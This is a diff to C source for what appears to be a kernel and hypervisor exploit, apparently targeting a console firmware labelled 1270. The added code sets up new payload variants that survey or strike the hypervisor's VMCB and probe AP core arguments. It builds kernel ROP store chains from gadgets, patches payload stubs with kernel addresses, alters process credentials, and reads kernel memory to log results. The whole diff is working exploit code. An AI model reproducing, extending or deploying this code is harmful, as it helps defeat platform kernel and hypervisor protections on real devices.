@@ -22,6 +22,15 @@
 #ifdef AP_NPT_TABLE_DUMP_1270
 #include "break_hv_payload/npt_table_dump.h"
 #endif
+#ifdef AP_VMCB_SURVEY_1270
+#include "break_hv_payload/vmcb_survey_1270.h"
+#endif
+#ifdef AP_VMCB_STRIKE_1270
+#include "break_hv_payload/vmcb_strike_1270.h"
+#endif
+#ifdef AP_CORE_ARG_1270
+#include "break_hv_payload/ap_arg_probe_1270.h"
+#endif
 
 #if defined(AP_OWNED_RESUME_1270) && !defined(FIXED_AP_PREP_ONLY_1270) && \
     !defined(AP_OWNED_RESUME_REENABLE_AFTER_KP_1270)
@@ -49,7 +58,21 @@
 #else
 #define CARRIER_PA          0x3ffff000ULL
 #endif
+#ifdef AP_VMCB_STRIKE_1270
+#define AP_SURVEY_ENTERED   0x1270A9E17E5E2001ULL
+#define AP_MARKER           0x1270A9E17E5E2002ULL
+#define AP_SURVEY_REJECTED  0x1270A9E17E5E2003ULL
+#define AP_STRIKE_FAILED    0x1270A9E17E5E2004ULL
+#define PARAM_QWORDS        3U
+#elif defined(AP_VMCB_SURVEY_1270)
+#define AP_SURVEY_ENTERED   0x1270A9E17E5E1001ULL
+#define AP_MARKER           0x1270A9E17E5E1002ULL
+#define AP_SURVEY_REJECTED  0x1270A9E17E5E1003ULL
+#define PARAM_QWORDS        3U
+#else
 #define AP_MARKER           0x1270A9E17E5E0002ULL
+#define PARAM_QWORDS        0U
+#endif
 #ifdef AP_NPT_TABLE_DUMP_1270
 #define NPT_TABLE_PA        0x62a81000ULL
 #define NPT_DUMP_OFF        0x1000ULL
@@ -57,6 +80,18 @@
 #define STUB_BYTES          75U
 #define STUB_QWORDS         10U
 #define PROBE_STEM          "fixed-ap-nptdump"
+#elif defined(AP_CORE_ARG_1270)
+#define STUB_BYTES          62U
+#define STUB_QWORDS         8U
+#define PROBE_STEM          "fixed-ap-arg"
+#elif defined(AP_VMCB_STRIKE_1270)
+#define STUB_BYTES          224U
+#define STUB_QWORDS         28U
+#define PROBE_STEM          "fixed-ap-vmcb-strike"
+#elif defined(AP_VMCB_SURVEY_1270)
+#define STUB_BYTES          170U
+#define STUB_QWORDS         22U
+#define PROBE_STEM          "fixed-ap-vmcb-survey"
 #elif defined(AP_VMCB_RW_1270)
 #define AP_RW_ENTERED       0x1270A9E17E5E0001ULL
 #define AP_RW_BAD           0x1270A9E17E5E0003ULL
@@ -146,6 +181,9 @@ static uint8_t npt_dump_before[NPT_DUMP_BYTES];
 static uint8_t npt_dump_after[NPT_DUMP_BYTES];
 static int npt_dump_armed;
 #endif
+#ifdef AP_CORE_ARG_1270
+static uint64_t ap_args[16];
+#endif
 #ifdef AP_OWNED_RESUME_1270
 static carrier1270_t owned_carrier;
 static uint8_t owned_carrier_before[STUB_QWORDS * 8];
@@ -162,7 +200,8 @@ static int append_store(kh_chain_t *chain, uint64_t dst, uint64_t value)
          kh_chain_g(chain, KERNEL_GADGET_ST_RCX_RAX) == 0 ? 0 : -1;
 }
 
-#if defined(AP_VMCB_RW_1270) || defined(AP_NPT_TABLE_DUMP_1270)
+#if defined(AP_VMCB_RW_1270) || defined(AP_NPT_TABLE_DUMP_1270) || \
+    defined(AP_CORE_ARG_1270)
 static int patch_token(uint64_t token, uint64_t value)
 {
   unsigned matches = 0;
@@ -178,7 +217,26 @@ static int patch_token(uint64_t token, uint64_t value)
 
 static int build_stub(uint64_t oracle, uint64_t vector)
 {
-#ifdef AP_NPT_TABLE_DUMP_1270
+#ifdef AP_VMCB_STRIKE_1270
+  if (vmcb_strike_1270_len != STUB_BYTES)
+    return -1;
+  memset(ap_stub, 0, sizeof(ap_stub));
+  memcpy(ap_stub, vmcb_strike_1270, STUB_BYTES);
+#elif defined(AP_CORE_ARG_1270)
+  if (ap_arg_probe_1270_len != STUB_BYTES)
+    return -1;
+  memset(ap_stub, 0, sizeof(ap_stub));
+  memcpy(ap_stub, ap_arg_probe_1270, STUB_BYTES);
+  if (patch_token(0x1111111111111111ULL, oracle + 8) != 0 ||
+      patch_token(0x2222222222222222ULL, oracle) != 0 ||
+      patch_token(0x3333333333333333ULL, vector) != 0)
+    return -1;
+#elif defined(AP_VMCB_SURVEY_1270)
+  if (vmcb_survey_1270_len != STUB_BYTES)
+    return -1;
+  memset(ap_stub, 0, sizeof(ap_stub));
+  memcpy(ap_stub, vmcb_survey_1270, STUB_BYTES);
+#elif defined(AP_NPT_TABLE_DUMP_1270)
   if (npt_table_dump_len != STUB_BYTES)
     return -1;
   memset(ap_stub, 0, sizeof(ap_stub));
@@ -320,7 +378,7 @@ static int guest_maps_pa(uint64_t pmap, uint64_t va, uint64_t expected)
 }
 #endif
 
-#ifdef AP_NPT_TABLE_DUMP_1270
+#if defined(AP_NPT_TABLE_DUMP_1270) || defined(AP_CORE_ARG_1270)
 static int all_zero(const uint8_t *buf, size_t len)
 {
   for (size_t i = 0; i < len; ++i)
@@ -328,7 +386,9 @@ static int all_zero(const uint8_t *buf, size_t len)
       return 0;
   return 1;
 }
+#endif
 
+#ifdef AP_NPT_TABLE_DUMP_1270
 static int save_npt_dump(void)
 {
   size_t len = strlen(output_path);
@@ -482,6 +542,9 @@ int main(void)
   uint64_t stock_vector = kdlsym(KERNEL_SYM_MP_STARTUP_INIT_VECTOR);
   uint64_t pmap = kdlsym(KERNEL_SYM_PMAP_STORE);
   uint64_t cr3 = 0, state = 0, marker_before = 0, ap_before = 0;
+#if defined(AP_VMCB_SURVEY_1270) || defined(AP_VMCB_STRIKE_1270)
+  uint64_t survey_before = 0;
+#endif
 #ifdef AP_HV_READ_1270
   uint64_t hv_value_before = 0;
 #ifdef AP_HV_DUAL_READ_1270
@@ -499,6 +562,10 @@ int main(void)
       marker_before != 0 ||
       read_qword(cave + KH_OFF_USER + 8, &ap_before) != 0 ||
       ap_before != 0
+#if defined(AP_VMCB_SURVEY_1270) || defined(AP_VMCB_STRIKE_1270)
+      || read_qword(cave + KH_OFF_USER + 16, &survey_before) != 0 ||
+      survey_before != 0
+#endif
 #ifdef AP_HV_READ_1270
       || read_qword(cave + KH_OFF_USER + 16, &hv_value_before) != 0 ||
       hv_value_before != 0 ||
@@ -520,6 +587,10 @@ int main(void)
       kread(cave + NPT_DUMP_OFF, npt_dump_before,
             sizeof(npt_dump_before)) != 0 ||
       !all_zero(npt_dump_before, sizeof(npt_dump_before))
+#endif
+#ifdef AP_CORE_ARG_1270
+      || kread(cave + KH_OFF_USER + 16, ap_args, sizeof(ap_args)) != 0 ||
+      !all_zero((const uint8_t *)ap_args, sizeof(ap_args))
 #endif
       ) {
     klog("RSH1270,1,stop,stage=preflight,target=0x%016" PRIx64
@@ -616,7 +687,7 @@ int main(void)
     return 5;
   }
 
-  uint8_t handler_buf[STUB_QWORDS * 5 * 8] = {0};
+  uint8_t handler_buf[(STUB_QWORDS + PARAM_QWORDS) * 5 * 8] = {0};
   kh_chain_t store_chain;
   kh_chain_init(&store_chain, handler_buf, sizeof(handler_buf));
   for (unsigned i = 0; i < STUB_QWORDS; ++i) {
@@ -626,6 +697,26 @@ int main(void)
       kernel_set_ucred_authid(getpid(), authid);
       return 5;
     }
+  }
+#if defined(AP_VMCB_SURVEY_1270) || defined(AP_VMCB_STRIKE_1270)
+  uint64_t params[PARAM_QWORDS] = {
+    stock_vector, kdldmap(0), cave + KH_OFF_USER + 8
+  };
+  for (unsigned i = 0; i < PARAM_QWORDS; ++i) {
+    if (append_store(&store_chain, carrier_va + 0xf00 + i * 8,
+                     params[i]) != 0) {
+      kernel_set_ucred_authid(getpid(), authid);
+      return 5;
+    }
+  }
+#endif
+
+  // The one-shot marker precedes this chain in the 0x600-byte data cave.
+  if (sizeof(uint64_t) * 5 + store_chain.len > BIG_SAVE_BYTES) {
+    kernel_set_ucred_authid(getpid(), authid);
+    klog("AFP1270,1,stop,stage=chain-capacity,bytes=%zu,capacity=%u\n",
+         sizeof(uint64_t) * 5 + store_chain.len, BIG_SAVE_BYTES);
+    return 5;
   }
 
   struct timespec stamp = {0};
@@ -820,6 +911,12 @@ int main(void)
     }
     if (marker == SECOND_MARKER &&
         (ap_marker == AP_MARKER
+#if defined(AP_VMCB_SURVEY_1270) || defined(AP_VMCB_STRIKE_1270)
+         || ap_marker == AP_SURVEY_REJECTED
+#endif
+#ifdef AP_VMCB_STRIKE_1270
+         || ap_marker == AP_STRIKE_FAILED
+#endif
 #ifdef AP_VMCB_RW_1270
          || ap_marker == AP_RW_BAD
 #endif
@@ -827,6 +924,13 @@ int main(void)
       break;
     if ((marker != 0 && marker != SECOND_MARKER) ||
         (ap_marker != 0 && ap_marker != AP_MARKER
+#if defined(AP_VMCB_SURVEY_1270) || defined(AP_VMCB_STRIKE_1270)
+         && ap_marker != AP_SURVEY_ENTERED &&
+         ap_marker != AP_SURVEY_REJECTED
+#endif
+#ifdef AP_VMCB_STRIKE_1270
+         && ap_marker != AP_STRIKE_FAILED
+#endif
 #ifdef AP_VMCB_RW_1270
          && ap_marker != AP_RW_ENTERED && ap_marker != AP_RW_BAD
 #endif
@@ -841,10 +945,21 @@ int main(void)
 
   int fired = marker == SECOND_MARKER;
   int ap_entered = ap_marker == AP_MARKER
+#if defined(AP_VMCB_SURVEY_1270) || defined(AP_VMCB_STRIKE_1270)
+                   || ap_marker == AP_SURVEY_ENTERED ||
+                   ap_marker == AP_SURVEY_REJECTED
+#endif
+#ifdef AP_VMCB_STRIKE_1270
+                   || ap_marker == AP_STRIKE_FAILED
+#endif
 #ifdef AP_VMCB_RW_1270
                    || ap_marker == AP_RW_ENTERED || ap_marker == AP_RW_BAD
 #endif
                    ;
+#if defined(AP_VMCB_SURVEY_1270) || defined(AP_VMCB_STRIKE_1270)
+  uint64_t survey_count = 0;
+  int survey_read = read_qword(cave + KH_OFF_USER + 16, &survey_count);
+#endif
 #ifdef AP_HV_READ_1270
   int hv_read = read_qword(cave + KH_OFF_USER + 16, &hv_value);
 #ifdef AP_HV_DUAL_READ_1270
@@ -867,6 +982,15 @@ int main(void)
   int dump_read = fired && ap_entered ?
                   kread(cave + NPT_DUMP_OFF, npt_dump_after,
                         sizeof(npt_dump_after)) : -1;
+#endif
+#ifdef AP_CORE_ARG_1270
+  int arg_read = fired && ap_entered ?
+                 kread(cave + KH_OFF_USER + 16, ap_args,
+                       sizeof(ap_args)) : -1;
+  unsigned arg_nonzero = 0;
+  if (arg_read == 0)
+    for (unsigned i = 0; i < 16; ++i)
+      arg_nonzero += ap_args[i] != 0;
 #endif
   int cleanup_result = cleanup(&hook, !fired, cave, authid, 1);
 #ifdef AP_NPT_TABLE_DUMP_1270
@@ -891,6 +1015,12 @@ int main(void)
 #ifdef AP_NPT_TABLE_DUMP_1270
            ",dump_read=%d,dump_saved=%d"
 #endif
+#if defined(AP_VMCB_SURVEY_1270) || defined(AP_VMCB_STRIKE_1270)
+           ",survey_count=%" PRIu64 ",survey_read=%d"
+#endif
+#ifdef AP_CORE_ARG_1270
+           ",arg_read=%d,arg_nonzero=%u"
+#endif
            ",bp_fired=%d,ap_entered=%d,resume_gap=%d,cleanup=%d\n",
            marker, ap_marker,
 #ifdef AP_HV_READ_1270
@@ -906,9 +1036,32 @@ int main(void)
 #ifdef AP_NPT_TABLE_DUMP_1270
            dump_read, dump_saved,
 #endif
+#if defined(AP_VMCB_SURVEY_1270) || defined(AP_VMCB_STRIKE_1270)
+           survey_count, survey_read,
+#endif
+#ifdef AP_CORE_ARG_1270
+           arg_read, arg_nonzero,
+#endif
            fired, ap_entered, saw_resume_gap,
            cleanup_result);
   int saved = save_line_retry(line);
+#ifdef AP_CORE_ARG_1270
+  if (arg_read == 0) {
+    char arg_line[384];
+    size_t used = (size_t)snprintf(arg_line, sizeof(arg_line), "ap_args");
+    for (unsigned i = 0; i < 16 && used < sizeof(arg_line); ++i)
+      used += (size_t)snprintf(arg_line + used, sizeof(arg_line) - used,
+                               ",%016" PRIx64, ap_args[i]);
+    if (used < sizeof(arg_line) - 1) {
+      arg_line[used++] = '\n';
+      arg_line[used] = '\0';
+      if (save_line_retry(arg_line) != 0)
+        saved = -1;
+    } else {
+      saved = -1;
+    }
+  }
+#endif
   klog("AFP1270,1,%s", line);
   // CLOCK_REALTIME may not expose the S3 pause to this polling thread.
   // The marker, cleanup, and durable result are the probe's success criteria.
@@ -924,6 +1077,13 @@ int main(void)
 #endif
 #ifdef AP_NPT_TABLE_DUMP_1270
          && dump_read == 0 && dump_saved == 0
+#endif
+#if defined(AP_VMCB_SURVEY_1270) || defined(AP_VMCB_STRIKE_1270)
+         && ap_marker == AP_MARKER && survey_read == 0 &&
+         survey_count == 16
+#endif
+#ifdef AP_CORE_ARG_1270
+         && arg_read == 0 && arg_nonzero != 0
 #endif
          ? 0 : 20;
 }
